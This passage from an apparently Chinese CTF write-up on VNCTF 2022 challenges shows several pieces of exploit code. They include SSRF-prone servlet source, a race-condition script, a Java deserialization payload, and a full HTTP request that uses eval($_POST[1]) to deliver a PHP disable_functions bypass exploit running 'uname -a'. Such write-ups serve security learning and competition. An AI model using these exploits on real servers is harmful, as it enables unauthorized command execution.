InputStream <span class=\"hljs-title\">visit</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">final</span> String url)</span> <span class=\"hljs-keyword\">throws</span> Exception </span>&#123;<br>        <span class=\"hljs-keyword\">final</span> URL file = <span class=\"hljs-keyword\">new</span> URL(url);<br>        <span class=\"hljs-keyword\">final</span> InputStream inputStream = file.openStream();<br>        <span class=\"hljs-keyword\">return</span> inputStream;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n<p>FileServlet.java</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-keyword\">package</span> servlet;<br><br><span class=\"hljs-keyword\">import</span> javax.servlet.annotation.*;<br><span class=\"hljs-keyword\">import</span> javax.servlet.http.*;<br><span class=\"hljs-keyword\">import</span> util.*;<br><span class=\"hljs-keyword\">import</span> org.apache.tomcat.util.http.fileupload.*;<br><span class=\"hljs-keyword\">import</span> java.io.*;<br><span class=\"hljs-keyword\">import</span> javax.servlet.*;<br><br><span class=\"hljs-meta\">@WebServlet</span>(name = <span class=\"hljs-string\">&quot;FileServlet&quot;</span>, urlPatterns = &#123; <span class=\"hljs-string\">&quot;/file&quot;</span> &#125;)<br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileServlet</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">HttpServlet</span></span><br>&#123;<br>    <span class=\"hljs-keyword\">protected</span> void doGet(<span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">HttpServletRequest</span> req, <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">HttpServletResponse</span> resp) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">ServletException</span>, <span class=\"hljs-type\">IOException</span> &#123;<br>        <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> url = req.getParameter(<span class=\"hljs-string\">&quot;url&quot;</span>);<br>        <span class=\"hljs-keyword\">if</span> (url != <span class=\"hljs-literal\">null</span>) &#123;<br>            <span class=\"hljs-type\">InputStream</span> responseContent = <span class=\"hljs-literal\">null</span>;<br>            <span class=\"hljs-keyword\">try</span> &#123;<br>                responseContent = <span class=\"hljs-type\">UrlUtil</span>.visit(url);<br>                <span class=\"hljs-type\">IOUtils</span>.copy(responseContent, (<span class=\"hljs-type\">OutputStream</span>)resp.getOutputStream());<br>                resp.flushBuffer();<br>            &#125;<br>            <span class=\"hljs-keyword\">catch</span> (<span class=\"hljs-type\">Exception</span> e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class=\"hljs-keyword\">finally</span> &#123;<br>                responseContent.close();<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">this</span>.<span class=\"hljs-type\">Response</span>(resp, <span class=\"hljs-string\">&quot;please input a url&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class=\"hljs-keyword\">private</span> void <span class=\"hljs-type\">Response</span>(<span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">HttpServletResponse</span> resp, <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> outStr) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">IOException</span> &#123;<br>        <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">ServletOutputStream</span> out = resp.getOutputStream();<br>        out.write(outStr.getBytes());<br>        out.flush();<br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>审计源码</p>\n<p>条件竞争拿 Key，EXP：</p>\n<figure class=\"highlight processing\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs processing\">from multiprocessing <span class=\"hljs-keyword\">import</span> Pool<br><span class=\"hljs-keyword\">import</span> os, time, <span class=\"hljs-built_in\">random</span><br><span class=\"hljs-keyword\">import</span> requests<br>#http:<span class=\"hljs-comment\">//1.13.163.248:8081/evi1?name=vnctf2022</span><br><br><br>def long_time_task(url):<br>    <span class=\"hljs-built_in\">print</span>(url)<br>    cnt = <span class=\"hljs-number\">0</span><br>    <span class=\"hljs-keyword\">while</span> True:<br>        cnt += <span class=\"hljs-number\">1</span><br>        <span class=\"hljs-keyword\">if</span> cnt%<span class=\"hljs-number\">10</span> == <span class=\"hljs-number\">0</span>:<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;又搞了100个请求&quot;</span>)<br>        r = requests.<span class=\"hljs-built_in\">get</span>(url,proxies=&#123;<span class=\"hljs-string\">&quot;http&quot;</span>:<span class=\"hljs-string\">&quot;http://127.0.0.1:8080&quot;</span>&#125;)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;The Key is &quot;</span> in r.<span class=\"hljs-built_in\">text</span>:<br>            <span class=\"hljs-built_in\">key</span> = r.<span class=\"hljs-built_in\">text</span><br>            with <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;key.txt&quot;</span>,<span class=\"hljs-string\">&quot;w&quot;</span>) as f:<br>                f.write(<span class=\"hljs-built_in\">key</span>)<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">key</span>)<br>            <span class=\"hljs-keyword\">break</span><br><span class=\"hljs-keyword\">if</span> __name__==<span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    p = Pool(<span class=\"hljs-number\">8</span>)<br>    <span class=\"hljs-keyword\">for</span> i in range(<span class=\"hljs-number\">4</span>):<br>        p.apply_async(long_time_task, args=(<span class=\"hljs-string\">&quot;http://1.13.163.248:8081/evi1?name=vnctf2022&quot;</span>,))<br>    <span class=\"hljs-keyword\">for</span> i in range(<span class=\"hljs-number\">4</span>):<br>        p.apply_async(long_time_task, args=(<span class=\"hljs-string\">&quot;http://1.13.163.248:8081/evi1?name=vnctf20222&quot;</span>,))<br>    p.close()<br>    p.<span class=\"hljs-built_in\">join</span>()<br></code></pre></td></tr></table></figure>\n<p>构造反序列化 exp：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">package</span> exp;<br><br><span class=\"hljs-keyword\">import</span> entity.User;<br><span class=\"hljs-keyword\">import</span> java.io.ByteArrayOutputStream;<br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.io.ObjectOutputStream;<br><span class=\"hljs-keyword\">import</span> java.util.Base64;<br><span class=\"hljs-keyword\">import</span> util.SerAndDe;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Main</span> </span>&#123;<br>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(String[] args)</span> <span class=\"hljs-keyword\">throws</span> IOException </span>&#123;<br>    String name = <span class=\"hljs-string\">&quot;m4n_q1u_666&quot;</span>;<br>    String age = <span class=\"hljs-string\">&quot;666&quot;</span>;<br>    String height = <span class=\"hljs-string\">&quot;180&quot;</span>;<br>    User user = <span class=\"hljs-keyword\">new</span> User(name, age, height);<br>    ByteArrayOutputStream bos = <span class=\"hljs-keyword\">new</span> ByteArrayOutputStream();<br>    ObjectOutputStream oos = <span class=\"hljs-keyword\">new</span> ObjectOutputStream(bos);<br>    oos.writeObject(user);<br><br>    <span class=\"hljs-keyword\">byte</span>[] ser = bos.toByteArray();<br>    Base64.Encoder encoder = Base64.getEncoder();<br>    String encodedText = encoder.encodeToString(ser);<br>    System.out.println(encodedText);<br>    User user2 = (User) SerAndDe.deserialize(ser);<br>    System.out.println(user2);<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n<p>注意写个和 readObject 对应的 writeObject</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\">package entity;<br><br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.io.ObjectInputStream;<br><span class=\"hljs-keyword\">import</span> java.io.Serializable;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">User</span> <span class=\"hljs-title\">implements</span> <span class=\"hljs-title\">Serializable</span> </span>&#123;<br>  <span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">String</span> name;<br>  <span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">String</span> age;<br>  <span class=\"hljs-keyword\">private</span> transient <span class=\"hljs-built_in\">String</span> height;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-title\">User</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">String</span> name, <span class=\"hljs-built_in\">String</span> age, <span class=\"hljs-built_in\">String</span> height</span>)</span> &#123;<br>    <span class=\"hljs-built_in\">this</span>.name = name;<br>    <span class=\"hljs-built_in\">this</span>.age = age;<br>    <span class=\"hljs-built_in\">this</span>.height = height;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">String</span> <span class=\"hljs-function\"><span class=\"hljs-title\">getName</span>(<span class=\"hljs-params\"></span>)</span> &#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.name;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-function\"><span class=\"hljs-title\">setName</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">String</span> name</span>)</span> &#123;<br>    <span class=\"hljs-built_in\">this</span>.name = name;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">String</span> <span class=\"hljs-function\"><span class=\"hljs-title\">getAge</span>(<span class=\"hljs-params\"></span>)</span> &#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.age;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-function\"><span class=\"hljs-title\">setAge</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">String</span> age</span>)</span> &#123;<br>    <span class=\"hljs-built_in\">this</span>.age = age;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">String</span> <span class=\"hljs-function\"><span class=\"hljs-title\">getHeight</span>(<span class=\"hljs-params\"></span>)</span> &#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.height;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-function\"><span class=\"hljs-title\">setHeight</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">String</span> height</span>)</span> &#123;<br>    <span class=\"hljs-built_in\">this</span>.height = height;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br>    <span class=\"hljs-built_in\">this</span>.height = (<span class=\"hljs-built_in\">String</span>)s.readObject();<br>  &#125;<br>  <span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> writeObject(java.io.ObjectOutputStream out) throws IOException &#123;<br>    out.defaultWriteObject();<br>    out.writeObject(<span class=\"hljs-built_in\">this</span>.height);<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">boolean</span> <span class=\"hljs-function\"><span class=\"hljs-title\">equals</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">Object</span> obj</span>)</span> &#123;<br>    <span class=\"hljs-keyword\">if</span> (obj == <span class=\"hljs-literal\">null</span>) &#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">this</span> == obj) &#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>    &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (obj <span class=\"hljs-keyword\">instanceof</span> User) &#123;<br>      User user = (User)obj;<br>      <span class=\"hljs-keyword\">return</span> user.getAge().equals(<span class=\"hljs-built_in\">this</span>.age) &amp;&amp; user.getHeight().equals(<span class=\"hljs-built_in\">this</span>.height) &amp;&amp; user.getName().equals(<span class=\"hljs-built_in\">this</span>.name);<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    &#125;<br>  &#125;<br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-built_in\">String</span> <span class=\"hljs-function\"><span class=\"hljs-title\">toString</span>(<span class=\"hljs-params\"></span>)</span> &#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;User&#123;name=&#x27;&quot;</span> + <span class=\"hljs-built_in\">this</span>.name + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&quot;, age=&#x27;&quot;</span> + <span class=\"hljs-built_in\">this</span>.age + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&quot;, height=&#x27;&quot;</span> + <span class=\"hljs-built_in\">this</span>.height + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&#x27;&#125;&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>拿到 flag</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105851.png\" alt=\"image-20220212164454472\" class=\"lazyload\"></p>\n<h3 id=\"interestingphp\"><a class=\"markdownIt-Anchor\" href=\"#interestingphp\">#</a> InterestingPHP</h3>\n<p>一句话</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105417.png\" alt=\"image-20220212164857605\" class=\"lazyload\"></p>\n<p>有 disable_functions</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105580.png\" alt=\"image-20220212165009928\" class=\"lazyload\"></p>\n<p>PHP 版本 7.2.25</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105540.png\" alt=\"image-20220212165050027\" class=\"lazyload\"></p>\n<p>尝试 bypass 的 exp：<a href=\"https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php%EF%BC%8C%E5%85%B6%E4%B8%AD\">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php，其中</a> <code>fwrite</code>  被禁了，改成 <code>fputs</code></p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/?exp=eval($_POST[1]);</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>b21e5822-28d4-4637-a2cd-770de49a5462.node4.buuoj.cn:81<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class=\"hljs-attribute\">Accept-Language</span><span class=\"hljs-punctuation\">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class=\"hljs-attribute\">Accept-Encoding</span><span class=\"hljs-punctuation\">: </span>gzip, deflate<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>6917<br><br><span class=\"php\">------WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class=\"php\">Content-Disposition: form-data; name=<span class=\"hljs-string\">&quot;1&quot;</span></span><br><span class=\"php\"></span><br><span class=\"php\">pwn(<span class=\"hljs-string\">&#x27;uname -a&#x27;</span>);</span><br><span class=\"php\"></span><br><span class=\"php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">pwn</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;LOGGING&#x27;</span>, <span class=\"hljs-literal\">false</span>);</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class=\"hljs-number\">0x60</span>);</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class=\"hljs-number\">0x20</span> : CHUNK_DATA_SIZE);</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class=\"hljs-number\">0x70</span> : <span class=\"hljs-number\">0x50</span>);</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class=\"hljs-number\">0x18</span> - <span class=\"hljs-number\">1</span>);</span><br><span class=\"php\">    define(<span class=\"hljs-string\">&#x27;CMD&#x27;</span>, <span class=\"hljs-variable\">$cmd</span>);</span><br><span class=\"php\">    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-number\">10</span>; <span class=\"hljs-variable\">$i</span>++) &#123;</span><br><span class=\"php\">        <span class=\"hljs-variable\">$groom</span>[] = Pwn::alloc(STRING_SIZE);</span><br><span class=\"php\">    &#125;</span><br><span class=\"php\">    stream_filter_register(<span class=\"hljs-string\">&#x27;pwn_filter&#x27;</span>, <span class=\"hljs-string\">&#x27;Pwn&#x27;</span>);</span><br><span class=\"php\">    <span class=\"hljs-variable\">$fd</span> = fopen(<span class=\"hljs-string\">&#x27;php://memory&#x27;</span>, <span class=\"hljs-string\">&#x27;w&#x27;</span>);</span><br><span class=\"php\">    stream_filter_append(<span class=\"hljs-variable\">$fd</span>,<span class=\"hljs-string\">&#x27;pwn_filter&#x27;</span>);</span><br><span class=\"php\">    fputs(<span class=\"hljs-variable\">$fd</span>, <span class=\"hljs-string\">&#x27;x&#x27;</span>);</span><br><span class=\"php\">&#125;</span><br><span class=\"php\"></span><br><span class=\"php\"><span class=\"hljs-class\"><span 